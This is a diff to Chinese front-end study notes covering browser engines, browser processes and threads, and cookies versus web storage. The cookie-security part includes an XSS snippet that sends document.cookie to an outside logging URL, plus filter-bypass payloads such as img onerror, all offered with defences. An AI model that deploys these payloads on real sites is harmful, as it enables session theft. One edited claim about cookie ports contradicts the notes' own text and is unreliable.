@@ -1,15 +1,109 @@
 ### 跨域问题
 
 
+## 浏览器
+
 ### 浏览器渲染机制
 
-#### 常见浏览器内核
 
-| 浏览器 | IE | FireFox | Chrome Opera | Safari |
-| --- | --- | --- | --- | --- |
-| 内核 |  Trident | Gecko | Blink | Webkit |
 
-浏览器内核分为两个部分: 渲染引擎和JS引擎
+### 浏览器内核
+
+浏览器内核分为两个部分: 渲染引擎(render engin)、js引擎(js engin)
+
+* 渲染引擎：负责对网页语法的解释（HTML、javaScript、引入css等），并渲染（显示）网页
+* js引擎：javaScript的解释、编译、执行
+
+主流内核:
+
+| 浏览器 | IE | FireFox | Chrome Opera | Safari | Edeg |
+| --- | --- | --- | --- | --- | --- |
+| 内核 |  Trident | Gecko | Blink | Webkit | 基于Chromium开发 |
+
+webkit浏览器内核
+![avator](https://user-gold-cdn.xitu.io/2018/12/3/16771e08d735e0be?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)
+
+* HTML解释器：解释HTML文本的解释器，主要作用是将HTML文本解释成DOM树，DOM是一种文档表示方法。
+* CSS解释器：级联样式表的解释器，它的作用是为DOM中的各个元素对象计算出样式信息，从而为计算最后网页的布局提供基础设施。
+* 布局：在DOM创建之后，webkit需要将其中的元素对象同样式信息结合起来，计算它们的大小位置等布局信息，形成一个能够表示这所有信息的内部比偶表示模型。
+* JavaScript引擎：使用JavaScript代码可以修改网页的内容，也能修改CSS的信息，JavaScript引擎能解释JavaScript代码并通过DOM接口和CSSOM视图模式来修改网页内容和样式信息，从而改变渲染结果。
+* 绘图：使用图形库将布局计算后的各个网页的节点绘制成图像结果。
+
+相关问题:
+1. 为什么说transform实现动画较直接设置几何属性性能较好？
+
+    * webkit渲染过程：style -> Layout(reflow发生在这) -> Paint（repaint发生在这） -> Composite，transform是位于’Composite（渲染层合并）‘，而width、left、margin等则是位于‘Layout（布局）’层，这必定导致reflow。
+    * 现代浏览器针对transform等开启GPU加速。
+
+2. Google Chromium 为什么要从 WebKit 中抽离，新建一个 Blink 分支？
+
+   Google 认为 Apple 在实现标准方面过于保守，Google 则更乐于实现各种草案标准，即使该标准处于 Working Draft 甚至是 Editor Draft 阶段，未来面临大改甚至废弃的可能。
+
+   Webkit始终是由苹果主导的项目，其目标是为苹果MAC OS以及iOS提供一个高效的浏览器渲染内核。相对于Google ,苹果是一家更传统的公司，其主要收入来自其硬件产品的销售。虽然苹果也对Web有着很大的兴趣，但和谷歌对Web的狂热相比，苹果更倾向于建立硬件+软件+iTunes的封闭生态系统，浏览器不是其重心。
+
+小知识点:
+* WebKit 是一个开源的浏览器引擎。它的前身是KDE在1998年开发的排版引擎KHTML，最初用于Linux和Unix等开源操作系统。因为KHTML拥有更清晰的架构，而且比Gecko更小巧，苹果从KHTML分支出来内部开始了WebKit的研发。
+* webkit内核默认js引擎为javascriptCore，而谷歌把其替换成了v8，所以原先Chrome浏览器虽然也是webkit内核（Chromium项目中研发的渲染引擎，基于并脱离Webkit），用的是v8引擎，而sfari浏览器内使用的webkit内核，其js引擎依旧是javascriptCore.
+* Chromium 是 Google 公司一个开源浏览器项目，使用 Blink 渲染引擎驱动。Chromium是基于Webkit，衍生出Blink。Chromium 和 Google Chrome 的关系，可以理解为：Chromium + 集成 Google 产品 = Google Chrome。可以理解为 Google Chrome 是个商业项目，而 Chromium 是一个中立、无立场的（理论上）的开源项目。微软基于 Google 的 Chromium 开发的新版 Microsoft Edge 浏览器已经正式发布。
+* CEF（Chromium Embeded Framework）
+  一个将浏览器功能（页面渲染、js执行）嵌入到其他应用程序的框架，支持windows, Linux, Mac平台
+  应用: 做一个浏览器、跨平台的桌面底层方案electron.js、 客户端（如：桌面端app应用）
+  好处：开发web和native混合的应用非常方便
+
+### 从浏览器的多进程到js的单线程
+注: 
+1. **进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位，系统会给它分配内存），不同进程之间也可以通信，不过代价较大**
+2. **线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等），现在，一般通用的叫法：单线程与多线程，都是指在一个进程内的单和多。**
+
+**现代浏览器基本上都是多进程的（早期浏览器是单进程的，因为多进程有更高的资源占用和更复杂的体系架构，但相对于单进程浏览器的不稳定，不流畅，不安全问题，多进程浏览器通过多进程，安全沙箱，进程之间的隔离等方法了，解决了单进程浏览器中存在的各种问题），浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存），简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。**
+
+##### 浏览器主要进程
+1. Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有
+    * 负责浏览器界面显示，与用户交互。如前进，后退等
+    * 负责各个页面的管理，创建和销毁其他进程
+    * 将Renderer进程得到的内存中的Bitmap，绘制到用户界面上
+    * 网络资源的管理，下载等
+2. 第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建
+3. GPU进程：最多一个，用于3D绘制等
+4. 浏览器渲染进程（浏览器内核，Renderer进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为：页面渲染，脚本执行，事件处理等
+
+当然，浏览器有时会将多个进程合并（譬如打开多个空白标签页后，会发现多个空白标签页被合并成了一个进程）
+
+##### 浏览器多进程的优势
+
+* 避免单个page crash影响整个浏览器
+* 避免第三方插件crash影响整个浏览器
+* 多进程充分利用多核优势
+* 方便使用沙盒模型隔离插件等进程，提高浏览器稳定性
+
+当然，多进程浏览器内存等资源消耗也会更大，有点空间换时间的意思
+
+##### 浏览器内核(渲染进程)
+页面的渲染，JS的执行，事件的循环，都在这个进程内进行。浏览器的渲染进程是多线程的。
+其主要包含线程：
+1. GUI渲染线程
+    * 负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。
+    * 当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行
+    * 注意，**GUI渲染线程与JS引擎线程是互斥的**，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。
+
+2. JS引擎线程
+    * 也称为JS内核，负责处理Javascript脚本程序。（例如V8引擎）
+    * JS引擎线程负责解析Javascript脚本，运行代码。
+    * JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序
+    * 同样注意，**GUI渲染线程与JS引擎线程是互斥的**，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。
+3. 事件触发线程
+    * 该归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助）
+    * 当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中
+    * 当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理
+    * 注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）
+4. 定时触发器线程
+    * setInterval与setTimeout所在线程
+    * 浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确）
+    * 因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行）
+    * 注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。
+5. 异步http请求线程
+    * 在XMLHttpRequest在连接后是通过浏览器新开一个线程请求
+    * 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。
 
 ### 浏览器缓存策略
 
@@ -185,14 +279,76 @@ CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。
 CORS是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。
 
 ## Cookie LocalStorage SessionStorage Session
+
 #### cookie localStorage sessionStorage三者区别
 
 * **容量方面**: localStorage 和 sessionStorage均为5M左右，cookie在不同的浏览器中每个域的数量和大小均不同，不过硬尽量保证数量小于20(ie7+, chrome, firefox最小50个，safari不限制)，大小应尽量小于4k
-* **时效性（声明周期）** localStroage和sessionStorage都以文件的形式存储在本地（硬盘），localStorage存储的数据是永久性的，除非用户人为删除否则一直存在，而sessionStorage则是其标签关闭数据也会被清除。cookie一般由服务器生成，可设置失效时间，如果在浏览器端生成cookie，默认关闭浏览器后失效。
+* **时效性（声明周期）** localStroage和sessionStorage都以文件的形式存储在本地（硬盘），localStorage存储的数据是永久性的，除非用户人为删除否则一直存在，而sessionStorage是会话级别的本地保存，其标签关闭数据也会被清除。cookie一般由服务器生成，可设置失效时间，如果在浏览器端生成cookie或未设置时效时间，默认关闭浏览器后失效。
 * **作用域** localStorage同一浏览器中，同源文档可以共享localStorage数据，而sessionStorage则是只有同一浏览器，同一窗口的同源文档才能共享数据（统一标签窗口不同的iframe也可以共享数据）。
 
 #### 三者相同
-* 都受浏览器同源策略限制（不过针对cookie的同源策略，只关注域名，忽略协议和端口）
+* 都受浏览器同源策略限制（不过针对cookie的同源策略，只关注域名和端口，忽略协议）
+
+#### Cookie
+因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。所以，需要额外的数据用于维护会话。
+
+Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求（同源）被发送到服务器，所以应该保证它不要太大。
+
+cookie分为 会话cookie 和 持久cookie ，会话cookie是指在不设定它的生命周期 expires 时的状态，浏览器的开启到关闭就是一次会话，当关闭浏览器时，会话cookie就会跟随浏览器而销毁。
+
+两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，http://example.com设置的 Cookie，可以被https://example.com读取。
+
+##### Set-Cookie
+响应首部 Set-Cookie 被用来由服务器端向客户端发送 cookie。
+
+指令:
+1. \<cookie-name>=\<cookie-value> 键值对
+2. Expires=\<date> 
+  cookie 的最长有效时间，形式为符合 HTTP-date 规范的时间戳。如果没有设置这个属性，那么表示这是一个会话期 cookie 。一个会话结束于客户端被关闭时，这意味着会话期 cookie 在彼时会被移除。然而，很多Web浏览器支持会话恢复功能，这个功能可以使浏览器保留所有的tab标签，然后在重新打开浏览器的时候将其还原。与此同时，cookie 也会恢复，就跟从来没有关闭浏览器一样。
+3. Max-Age=\<non-zero-digit> 
+  在 cookie 失效之前需要经过的秒数。秒数为 0 或 -1 将会使 cookie 直接过期。一些老的浏览器（ie6、ie7 和 ie8）不支持这个属性。对于其他浏览器来说，假如二者 （指 Expires 和Max-Age） 均存在，那么 Max-Age 优先级更高。
+4. Domain=\<domain-value>
+  Domain属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如www.example.com会设为example.com，而且以后如果访问example.com的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在Set-Cookie字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。
+5. Path=\<path-value> 
+  Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致。
+6. Secure
+  一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。
+  注意： 非安全站点（http:）已经不能再在 cookie 中设置 secure 指令了（在Chrome 52+ and Firefox 52+ 中新引入的限制）。
+7. HttpOnly
+  设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）。
+8. SameSite=Strict、SameSite=Lax、SameSite=None
+  允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。
+  Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
+  Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。
+  Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。
+
+##### Cookie的安全问题
+
+XSS(Cross-Site Scripting，跨站脚本攻击)是一种代码注入攻击。 攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。 利用这些恶意脚本，攻击者可获取用户的敏感信息如Cookie、SessionID 等，进而危害数据安全。
+
+XSS攻击可能会窃取网页浏览中的cookie值、劫持流量实现恶意跳转等。
+
+例如:
+
+```javascript
+<script>
+  new Image().src =
+      "http://jehiah.com/_sandbox/log.cgi?c=" + encodeURI(document.cookie);
+</script>
+```
+如果将这段代码插入到某个登陆用户的页面，则Cookie就会通过 HTTP 请求发送给给指定服务，然后就可以伪造那个可怜的登陆用户了
+
+**解决**：
+* 对用户输入内容设置过滤规则。
+* 任何私密数据都不应保存在cookie中。登录功能在cookie只保留一个session id，同时服务端要做好常规的安全检验（不停地重设session的重设；将过期时间设置短一些；监控referrer与userAgent的值）。
+* 使用HttpOnly禁止脚本读取Cookie。（如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，对于 document.cookie 来说是透明的。）
+
+**注意，上面的情况也能绕过**
+* 大小写绕过
+  这个绕过方式的出现是因为网站仅仅只过滤了\<script>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。
+* 并不是只有script标签才可以插入代码
+  `<img src='w.123' onerror='alert("hey!")'>`指定的图片地址根本不存在也就是一定会发生错误，这时候onerror里面的代码自然就得到了执行。
+* 主动闭合标签实现注入代码
 
 #### Session
 Session是无状态的HTTP协议下，服务端记录用户状态时用于标识具体用户的机制。它是在服务端保存的用来跟踪用户的状态的数据结构，可以保存在文件、数据库或者集群中。
@@ -200,6 +356,8 @@ Session是无状态的HTTP协议下，服务端记录用户状态时用于标识
 在浏览器关闭后这次的Session就消失了，下次打开就不再拥有这个Session。其实并不是Session消失了，而是Session ID变了，服务器端可能还是存着你上次的Session ID及其Session 信息，只是他们是无主状态，也许一段时间后会被删除。
 
 大多数的应用都是用Cookie来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录一个SessionID，以后每次请求把这个会话ID发送到服务器。
+
+session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用cookie。
 
 #### Session 和 Cookie 的关系与区别
 
